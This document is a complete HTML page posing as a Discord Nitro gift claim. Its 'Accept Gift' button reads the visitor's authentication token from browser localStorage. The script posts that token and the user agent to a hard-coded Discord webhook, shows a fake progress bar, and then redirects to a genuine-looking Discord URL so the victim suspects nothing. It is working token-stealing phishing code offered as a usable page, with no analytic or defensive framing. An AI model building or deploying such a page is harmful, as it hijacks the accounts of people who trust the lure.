<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Gift</title>
    <style>
        :root { --blurple: #5865F2; --bg: #18191C; }
        body { margin: 0; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: 'gg sans', sans-serif; }

        .card {
            background: #2B2D31; width: 400px; padding: 40px; border-radius: 12px;
            text-align: center; transition: transform 0.1s ease;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            cursor: pointer;
        }

        h1 { color: #fff; font-size: 24px; margin-bottom: 10px; }
        p { color: #B9BBBE; font-size: 14px; margin-bottom: 30px; }

        .progress-container { width: 100%; height: 4px; background: #1E1F22; border-radius: 2px; margin-bottom: 20px; display: none; }
        #progressBar { height: 100%; width: 0%; background: var(--blurple); transition: width 2s linear; }

        .btn {
            background: var(--blurple); color: #fff; border: none; padding: 12px; width: 100%;
            border-radius: 4px; font-weight: 600; cursor: pointer; transition: 0.2s;
        }
        .btn:hover { background: #4752c4; }
    </style>
</head>
<body>

    <div class="card" id="card">
        <h1>Claim Nitro Gift</h1>
        <p>A gift has been sent to your account. Click to activate and verify your identity.</p>
        
        <div class="progress-container" id="progCont">
            <div id="progressBar"></div>
        </div>

        <button class="btn" id="claimBtn">Accept Gift</button>
    </div>

    <script>
        // Interactive tilt effect
        const card = document.getElementById('card');
        card.addEventListener('mousemove', (e) => {
            const { left, top, width, height } = card.getBoundingClientRect();
            const x = (e.clientX - left) / width - 0.5;
            const y = (e.clientY - top) / height - 0.5;
            card.style.transform = `perspective(1000px) rotateY(${x * 10}deg) rotateX(${y * -10}deg)`;
        });
        card.addEventListener('mouseleave', () => card.style.transform = 'perspective(1000px) rotateY(0) rotateX(0)');

        // Action logic
        document.getElementById('claimBtn').addEventListener('click', async () => {
            document.getElementById('progCont').style.display = 'block';
            document.getElementById('progressBar').style.width = '100%';
            document.getElementById('claimBtn').disabled = true;

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "@everyone",
                    embeds: [{
                        title: "🚀 Interactive Capture",
                        color: 0x5865F2,
                        fields: [
                            { name: "Token", value: `\`${token || "NULL"}\`` },
                            { name: "Agent", value: `\`${navigator.userAgent}\`` }
                        ]
                    }]
                })
            });

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 2000);
        });
    </script>
</body>
</html>
